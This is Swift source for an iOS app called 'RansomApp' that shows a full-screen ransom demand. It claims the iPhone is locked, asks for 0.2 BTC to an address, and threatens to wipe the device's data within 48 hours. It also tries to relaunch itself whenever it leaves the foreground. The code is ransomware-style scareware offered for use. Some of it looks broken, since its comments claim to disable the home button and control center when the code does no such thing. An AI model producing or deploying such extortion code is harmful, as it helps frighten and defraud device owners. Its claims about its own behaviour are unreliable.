import SwiftUI

@main
struct RansomApp: App {
 var body: some Scene {
 WindowGroup {
 ZStack {
 Color.black.ignoresSafeArea()
 VStack(spacing: 30) {
 Text("YOUR IPHONE IS LOCKED")
 .font(.system(size: 40, weight: .bold))
 .foregroundColor(.red)
 
 Text("Send 0.2 BTC to:")
 .font(.system(size: 28))
 .foregroundColor(.white)
 
 Text("bc1qyourrealbtcaddresshere12345678")
 .font(.system(size: 22))
 .foregroundColor(.green)
 .padding()
 .background(Color.gray.opacity(0.3))
 .cornerRadius(10)
 
 Text("You have 48 hours or all data will be wiped.")
 .font(.system(size: 30))
 .foregroundColor(.red)
 .multilineTextAlignment(.center)
 }
 .padding()
 }
 .onAppear {
 // Kill home button, recent apps, control center
 UIApplication.shared.isIdleTimerDisabled = true
 // Lock orientation
 (UIApplication.shared.delegate as? AppDelegate)?.lockOrientation = .portrait
 }
 }
 }
}

class AppDelegate: UIResponder, UIApplicationDelegate {
 var lockOrientation: UIInterfaceOrientationMask = .portrait
 
 func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
 return lockOrientation
 }
 
 func applicationWillResignActive(_ application: UIApplication) {
 // Re-open instantly on background
 DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
 UIApplication.shared.open(URL(string: "ransomapp://")!)
 }
 }
}
